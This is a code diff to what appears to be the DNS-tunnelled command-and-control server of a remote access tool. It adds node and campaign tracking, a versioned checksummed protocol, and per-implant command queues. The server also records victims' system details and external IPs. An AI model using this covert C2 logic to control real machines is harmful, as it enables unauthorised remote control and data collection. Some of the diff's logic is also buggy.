@@ -50,32 +50,27 @@ def convert_node(node):
     except:
         return int(node, 16)
 
-class Session(object):
-    def __init__(self, spi, encoder, commands, timeout):
-        self.spi = spi
+class DeprecatedVersion(Exception):
+    pass
+
+class UnknownVersion(Exception):
+    pass
+
+class ExpirableObject(object):
+
+    __slots__ = (
+        '_start', '_last_access', 'timeout'
+    )
+
+    def __init__(self, timeout):
+        self.timeout = timeout
+
         self._start = time.time()
-        self._encoder = encoder
         self._last_access = 0
-        self._timeout = timeout
-        self.system_info = None
-        self.system_status = None
-        self.online_status = None
-        self.open_ports = {}
-        self.egress_ports = set()
-        self.commands = commands
-        self.last_nonce = None
-        self.last_qname = None
-        self.pstore_dirty = False
-        self.connecteed = False
-        self.cache = {}
 
     @property
-    def timeout(self):
-        return ( self.idle > self._timeout )
-
-    @timeout.setter
-    def timeout(self, value):
-        self._timeout = value
+    def expired(self):
+        return ( self.idle > self.timeout )
 
     @property
     def idle(self):
@@ -85,9 +80,64 @@ class Session(object):
     def duration(self):
         return int(time.time() - self._start)
 
+    def bump(self):
+        self._last_access = time.time()
+
+class Node(ExpirableObject):
+    __slots__ = (
+        'node', 'cid', 'version', 'commands'
+    )
+
+    def __init__(self, node, timeout, cid=31337, version=1, commands=[]):
+        super(Node, self).__init__(timeout)
+        self.node = node
+        self.cid = cid
+        self.version = version
+        self.commands = commands or []
+
+    def add_command(self, command):
+        if not self.commands:
+            self.commands = [command]
+        else:
+            self.commands.append(command)
+
+    def __repr__(self):
+        return '{{NODE:{:012X} CID:{:016X} COMMANDS:{}}}'.format(
+            self.node, self.cid, len(self.commands))
+
+class Session(ExpirableObject):
+
+    __slots__ = (
+        'spi', 'node', 'cid',
+        'system_info', 'system_status', 'online_status',
+        'open_ports', 'egress_ports', 'commands',
+        'last_nonce', 'last_qname', 'pstore_dirty', 'connected',
+        'cache',
+        '_encoder'
+    )
+
+    def __init__(self, node, cid, spi, encoder, commands, timeout):
+        super(Session, self).__init__(timeout)
+
+        self._encoder = encoder
+
+        self.node = node
+        self.cid = cid
+        self.spi = spi
+        self.system_info = None
+        self.system_status = None
+        self.online_status = None
+        self.open_ports = {}
+        self.egress_ports = set()
+        self.commands = commands
+        self.last_nonce = None
+        self.last_qname = None
+        self.pstore_dirty = False
+        self.connected = False
+        self.cache = {}
+
     @property
     def encoder(self):
-        self._last_access = time.time()
         return self._encoder
 
     def add_command(self, command):
@@ -125,6 +175,7 @@ class DnsCommandServerException(Exception):
 class DnsCommandServerHandler(BaseResolver):
     def __init__(self, domain, key, recursor=None, timeout=None):
         self.sessions = {}
+        self.nodes = {}
         self.domain = domain
         self.recursor = recursor
         self.encoder = ECPV(private_key=key)
@@ -147,14 +198,26 @@ class DnsCommandServerHandler(BaseResolver):
         self.node_commands = {}
         self.lock = RLock()
         self.finished = Event()
+        self.allow_v1 = True
 
     def cleanup(self):
         while not self.finished.is_set():
             with self.lock:
                 to_remove = []
+
                 for spi, session in self.sessions.iteritems():
-                    if session.idle > self.timeout:
+                    if session.expired:
                         to_remove.append(spi)
+
+                for nodeid, node in self.nodes.iteritems():
+                    if node.expired:
+                        to_remove.append(nodeid)
+
+                for nodeid in to_remove:
+                    del self.nodes[nodeid]
+
+                to_remove = []
+
                 for spi in to_remove:
                     self.on_session_cleaned_up(self.sessions[spi])
                     del self.sessions[spi]
@@ -174,6 +237,7 @@ class DnsCommandServerHandler(BaseResolver):
     def add_command(self, command, session=None, default=False):
         if default and session:
             nodes = session
+
             if type(nodes) in (str,unicode):
                 nodes = [ convert_node(x) for x in nodes.split(',') ]
             elif type(nodes) == int:
@@ -181,6 +245,12 @@ class DnsCommandServerHandler(BaseResolver):
 
             idx = 0
             for node in nodes:
+                if node in self.nodes:
+                    if node in self.sessions:
+                        continue
+
+                    self.nodes[node].add_command(command)
+
                 if not node in self.node_commands:
                     self.node_commands[node] = []
 
@@ -228,6 +298,9 @@ class DnsCommandServerHandler(BaseResolver):
 
             idx = 0
             for node in nodes:
+                if node in self.nodes:
+                    self.nodes[node].commands = []
+
                 if node in self.node_commands:
                     del self.node_commands[node]
                     idx += 1
@@ -263,6 +336,20 @@ class DnsCommandServerHandler(BaseResolver):
             return count
 
     @locked
+    def find_nodes(self, node):
+        if node is None:
+            return self.nodes.itervalues()
+
+        if type(node) in (str,unicode):
+            node = [ convert_node(x) for x in node.split(',') ]
+        elif type(node) == int:
+            node = [ node ]
+
+        return [
+            self.nodes[x] for x in node if x in self.nodes
+        ]
+
+    @locked
     def find_sessions(self, spi=None, node=None):
         if spi:
             if type(spi) in (str,unicode):
@@ -283,14 +370,15 @@ class DnsCommandServerHandler(BaseResolver):
             ]
         elif spi:
             return [
-                self.sessions.get(x) for x in spi if x in self.sessions
+                self.sessions[x] for x in spi if x in self.sessions
             ]
         elif node:
             return [
                 session for session in self.sessions.itervalues() \
-                    if session.system_info and \
+                    if session.cid == node or session.node == node or (
+                        session.system_info and \
                         ( session.system_info['node'] in set(node)
-                              or str(session.system_info['external_ip']) in set(node) )
+                              or str(session.system_info['external_ip']) in set(node) ))
             ]
 
     @locked
@@ -365,7 +453,7 @@ class DnsCommandServerHandler(BaseResolver):
         payload = length + data
 
         if len(payload) > 48:
-            raise ValueError('Page size more than 45 bytes ({})'.format(len(payload)))
+            raise ValueError('Page size more than 46 bytes ({})'.format(len(payload)))
 
         response = []
 
@@ -398,44 +486,106 @@ class DnsCommandServerHandler(BaseResolver):
             ])) for part in parts
         ]
 
+        node_blob = ''
+        node = None
+        cid = None
+        version = 1
+        csum_check = None
+        csum_gen = None
+
         if len(parts) == 2:
-            nonce, data = parts
-            nonce = struct.unpack('>I', nonce)[0]
+            nonce_blob, data = parts
+            nonce = struct.unpack_from('>I', nonce_blob)[0]
+
+            if len(nonce_blob) > 4:
+                node_blob = nonce_blob[4:]
+
             encoder = self.encoder
             session = None
+
         elif len(parts) == 3:
-            spi, nonce, data = parts
+            spi, nonce_blob, data = parts
             spi = struct.unpack('>I', spi)[0]
-            nonce = struct.unpack('>I', nonce)[0]
+            nonce = struct.unpack_from('>I', nonce_blob)[0]
+
+            if len(nonce_blob) > 4:
+                node_blob = nonce_blob[4:]
+
             session = None
             with self.lock:
                 if not spi in self.sessions:
                     raise DnsCommandServerException('NO_SESSION', nonce)
+
                 session = self.sessions[spi]
-            encoder = session.encoder
+                encoder = session.encoder
 
-        return encoder.decode(data, nonce, symmetric=True), session, nonce
+        payload = encoder.decode(data+node_blob, nonce, symmetric=True)
 
+        if node_blob:
+            offset_node_blob = len(payload) - (1+8+6)
+            payload, node_blob = payload[:offset_node_blob], payload[offset_node_blob:]
 
-    def _cmd_processor(self, command, session):
-        logger.debug('command={}/{} session={} / node commands={}'.format(
+            version, cid = struct.unpack_from('>BQ', node_blob)
+
+            if version != 2:
+                raise UnknownVersion()
+
+            node = from_bytes(node_blob[1+8:1+8+6])
+            csum_check = encoder.check_csum
+            csum_gen = encoder.gen_csum
+
+        elif not self.allow_v1:
+            raise DeprecatedVersion()
+
+        return payload, session, nonce, node, cid, version, csum_check, csum_gen
+
+    def _cmd_processor(self, command, session, node, cid, version, csum_gen, csum_check):
+        logger.debug('command={}/{} session={} / node commands={} / node = {} / cid = {}'.format(
             command, type(command).__name__,
             '{:08x}'.format(session.spi) if session else None,
-            bool(self.node_commands)))
+            bool(self.node_commands), node, cid))
+
+        with self.lock:
+            if node:
+                if not node in self.nodes:
+                    self.nodes[node] = Node(
+                        node, self.timeout,
+                        cid, version, self.node_commands.get(node),
+                    )
+
+                node = self.nodes[node]
+                node.bump()
+
+            if session:
+                session.bump()
+
+            if session and not node:
+                if session.node in self.nodes:
+                    self.nodes[session.node].bump()
 
         if isinstance(command, Poll) and session is None:
             if not self.kex:
-                if self.node_commands and not self.commands:
-                    return [Policy(self.interval, self.kex), Poll()]
+                if node:
+                    return node.commands
+
+                elif self.node_commands and not self.commands:
+                    pass
+
                 elif self.commands:
                     return self.commands
+
                 else:
                     return [Policy(self.interval, self.kex)]
-            else:
-                return [Policy(self.interval, self.kex), Poll()]
+
+            return [Policy(self.interval, self.kex), Poll()]
 
         elif isinstance(command, Ack) and (session is None):
-            pass
+            if node:
+                if len(node.commands) < command.amount:
+                    logger.debug('ACK: invalid amount of commands: {} > {}'.format(
+                        command.amount, len(node.commands)))
+
+                node.commands = node.commands[command.amount:]
 
         elif isinstance(command, Exit):
             if session and session.system_info:
@@ -458,20 +608,27 @@ class DnsCommandServerHandler(BaseResolver):
             commands = session.commands
             return commands
 
-        elif isinstance(command, SystemInfo) and self.node_commands:
-            node = command.node
+        elif isinstance(command, SystemInfo) and not session:
             extip = str(command.external_ip)
 
+            if not node:
+                with self.lock:
+                    if not command.node in self.nodes:
+                        self.nodes[command.node] = Node(
+                            command.node, self.timeout,
+                            commands = self.node_commands.get(node)
+                        )
+
+                        node = self.nodes[command.node]
+
+                        if extip in self.node_commands:
+                            for command in self.node_commands[extip]:
+                                node.add_command(command)
+
             logger.debug('SystemStatus + No session + node_commands: {}/{} in {}?'.format(
-                node, extip, self.node_commands.keys()))
+                node, extip, node.commands))
 
-            if node in self.node_commands:
-                return self.node_commands[node]
-
-            elif extip in self.node_commands:
-                return self.node_commands[extip]
-
-            logger.debug('SystemStatus + No session + node_commands - not found')
+            return node.commands
 
         elif isinstance(command, OnlineStatus) and session is not None:
             session.online_status = command.get_dict()
@@ -510,6 +667,7 @@ class DnsCommandServerHandler(BaseResolver):
 
                 if not command.spi in self.sessions:
                     self.sessions[command.spi] = Session(
+                        node, cid,
                         command.spi,
                         self.encoder.clone(),
                         self.commands,
@@ -559,8 +717,12 @@ class DnsCommandServerHandler(BaseResolver):
         session = None
         nonce = None
 
+        csum_check, csum_gen = None, None
+
         try:
-            request, session, nonce = self._q_page_decoder(qname)
+            request, session, nonce, node, cid, version, csum_check, csum_gen = \
+              self._q_page_decoder(qname)
+
             if session and session.last_nonce and session.last_qname:
                 if nonce < session.last_nonce:
                     logger.info('Ignore nonce from past: {} < {}'.format(
@@ -571,8 +733,9 @@ class DnsCommandServerHandler(BaseResolver):
                         session.last_qname, qname))
                     return []
 
-            for command in Parcel.unpack(request):
-                for response in self._cmd_processor(command, session):
+            for command in Parcel.unpack(request, nonce, csum_check):
+                for response in self._cmd_processor(command, session, node, cid,
+                                                    version, csum_check, csum_gen):
                     responses.append(response)
 
             if session:
@@ -621,7 +784,7 @@ class DnsCommandServerHandler(BaseResolver):
         encoder = session.encoder if session else self.encoder
 
         try:
-            payload = Parcel(*responses).pack()
+            payload = Parcel(*responses).pack(nonce, csum_gen)
         except PackError, e:
             logger.error('Could not create parcel from commands: {} (session={})'.format(
                 e, '{:08x}'.format(session.spi) if session else None))
